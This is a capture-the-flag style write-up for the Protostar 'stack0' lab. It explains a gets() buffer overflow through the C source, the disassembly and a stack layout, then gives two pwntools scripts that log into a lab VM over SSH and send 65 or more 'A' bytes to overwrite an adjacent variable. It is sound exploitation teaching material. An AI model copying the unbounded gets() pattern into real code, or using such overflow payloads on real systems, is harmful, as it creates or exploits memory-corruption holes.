# STACK 0



```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```

The main function is pretty straightforward, it is asking for a user input which is stored in a variable called
'buffer' and check if a variable called 'modified' has change or not.

 <b>Goal</b> : overwrite the content of the variable named 'modified'

## Vulnerable function : gets()

The first thing we can notice is the usage of gets() function. If you are a bit familiar with c , gets() is a function you 
should avoid when you need user interaction in c code  because it don't have any length control on a given input.


## Deep into assembly code

Let's look the assembly code to understand how many bytes we should send in buffer to overwrite 'modified'.



```asm
0x080483f4 <main+0>:	push   ebp
0x080483f5 <main+1>:	mov    ebp,esp
0x080483f7 <main+3>:	and    esp,0xfffffff0
0x080483fa <main+6>:	sub    esp,0x60                 
0x080483fd <main+9>:	mov    DWORD PTR [esp+0x5c],0x0     <-- initialization of 'modified'
0x08048405 <main+17>:	lea    eax,[esp+0x1c]               <--  'buffer' variable starts at esp+0x1c
0x08048409 <main+21>:	mov    DWORD PTR [esp],eax         
0x0804840c <main+24>:	call   0x804830c <gets@plt>       
0x08048411 <main+29>:	mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:	test   eax,eax
0x08048417 <main+35>:	je     0x8048427 <main+51>
0x08048419 <main+37>:	mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:	call   0x804832c <puts@plt>
0x08048425 <main+49>:	jmp    0x8048433 <main+63>
0x08048427 <main+51>:	mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:	call   0x804832c <puts@plt>
0x08048433 <main+63>:	leave  
0x08048434 <main+64>:	ret 

```
We have found where in the stack 'buffer' and 'modified' are located.

Our target variable  'modified' is an integer so 4 bytes are allocated starting at esp+0x5c.

'buffer' is located at esp+0x1c. 

Since the stack grows downwards esp+0x1c is under esp+0x5c : 
```
  |  |                     |
  |  |     modified        | 
  |  |                     | 
  |  |---------------------|esp+0x5c (esp+92)
  |  |                     |
  |  |       BUFFER        |   
  |  |                     |
  |  |---------------------|esp+0x1c  (esp+28)
  |  |      ...            |
  |  |---------------------| <-- esp 
  v
```
First conclusion we can overwrite the content of the variable 'modified'.

Now let's calculate with how  many bytes we should  add in 'buffer' to overwrite 'modified' : 



```
 0x5c- 0x1c  = 64

```
The compiler allocate 64 bytes to 'buffer' and just after  we can overwrite the content of 'modified'.

We need to add at least one more byte to overwrite 'modified' and take over the control of  this variable.



Time to write the script.


# Scripting 

```python

from pwn import *


#  IP OF THE VM 192.168.160.128
# location of the binary /opt/protostar/bin/stack0



remote_ssh =  ssh(host='192.168.160.128', user='user', password='user')

re_process = remote_ssh.run(['/opt/protostar/bin/stack0'])

payload=b'A'*65 
re_process.sendline(payload)

print(re_process.recvline())

re_process.close()


```


![](win_mess.png)


Succeed  !!

bruteforce script for lazy people : 

```python
from pwn import *



#  IP OF THE VM 192.168.160.128
# location of the binary /opt/protostar/bin/stack0

r = ssh(host='192.168.160.128', user='user', password='user')

payload=b'A'
counter=1
response=''
while "you have" not in response :
    my_prog = r.run(['/opt/protostar/bin/stack0'])
    my_prog.sendline(payload)
    response = (my_prog.recvline()).decode()
    
    payload+=b'A'
    counter+=1
    my_prog.close()


print(response)
print("payload size : ", counter)

```


